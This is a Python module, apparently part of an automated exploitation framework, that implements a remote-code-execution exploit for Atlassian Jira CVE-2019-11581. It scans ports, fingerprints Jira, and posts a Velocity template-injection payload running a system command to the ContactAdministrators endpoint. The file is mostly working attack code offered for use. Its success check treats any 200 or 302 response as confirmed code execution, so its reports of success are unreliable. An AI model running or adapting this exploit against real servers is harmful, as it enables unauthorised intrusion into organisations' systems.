"""
Atlassian Jira Exploit (CVE-2019-11581)
Template injection for Remote Code Execution
"""

import socket
import requests
from typing import Dict, Tuple
import sys
import os

sys.path.append(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from exploits.exploit_manager import BaseExploit
from utils.logger import logger


class Jira_Exploit(BaseExploit):
    """
    Atlassian Jira CVE-2019-11581 Exploit
    Targets: Jira Server/Data Center < 7.13.5, 8.0.0-8.2.3
    
    Attack Vector:
    - Server-Side Template Injection (SSTI)
    - ContactAdministrators feature
    - Remote Code Execution
    """
    
    def __init__(self):
        super().__init__(
            name="Jira_CVE-2019-11581",
            target_ports=[8080, 80, 443],
            target_os=["Windows", "Linux", "Unix"]
        )
    
    def check_vulnerable(self, target: Dict) -> bool:
        """Check if target is running vulnerable Jira"""
        ip = target['ip']
        
        for port in [8080, 80, 443]:
            if port in target.get('open_ports', []):
                try:
                    protocol = "https" if port == 443 else "http"
                    url = f"{protocol}://{ip}:{port}/"
                    
                    response = requests.get(url, timeout=5, verify=False)
                    
                    # Check for Jira
                    if 'jira' in response.text.lower() or 'atlassian' in response.text.lower():
                        logger.debug(f"Jira detected on {ip}:{port}")
                        return True
                        
                except Exception as e:
                    logger.debug(f"Jira check failed on {ip}:{port}: {e}")
        
        return False
    
    def exploit(self, target: Dict) -> Tuple[bool, Dict]:
        """Attempt Jira CVE-2019-11581 exploitation"""
        ip = target['ip']
        
        logger.info(f"Attempting Jira CVE-2019-11581 on {ip}")
        
        # Find which port has Jira
        port = 8080
        for p in [8080, 80, 443]:
            if p in target.get('open_ports', []):
                port = p
                break
        
        protocol = "https" if port == 443 else "http"
        
        try:
            # CVE-2019-11581: SSTI in ContactAdministrators
            
            # Template injection payload
            # Velocity template for command execution
            payload = (
                "$i18n.getClass().forName('java.lang.Runtime')"
                ".getMethod('getRuntime',null).invoke(null,null)"
                ".exec('whoami').waitFor()"
            )
            
            url = f"{protocol}://{ip}:{port}/secure/ContactAdministrators!default.jspa"
            
            data = {
                'subject': 'Test',
                'from': 'test@test.com',
                'details': payload
            }
            
            response = requests.post(url, data=data, timeout=10, verify=False)
            
            # Check if template was processed
            if response.status_code in [200, 302]:
                self.stats['success'] += 1
                logger.success(f"Jira RCE successful on {ip}")
                
                return True, {
                    'method': 'Jira_CVE-2019-11581',
                    'port': port,
                    'service': 'Atlassian Jira',
                    'rce': True
                }
            
            self.stats['failure'] += 1
            return False, {}
            
        except Exception as e:
            self.stats['failure'] += 1
            logger.error(f"Jira exploit error on {ip}: {e}")
            return False, {}


if __name__ == "__main__":
    # Test the exploit
    jira = Jira_Exploit()
    
    test_target = {
        'ip': '192.168.1.100',
        'open_ports': [8080],
        'os_guess': 'Linux'
    }
    
    print(f"Testing Jira exploit on {test_target['ip']}")
    
    if jira.check_vulnerable(test_target):
        print("Target appears vulnerable")
        success, result = jira.exploit(test_target)
        
        if success:
            print(f"Exploit successful: {result}")
        else:
            print("Exploit failed")
    else:
        print("Target not vulnerable")
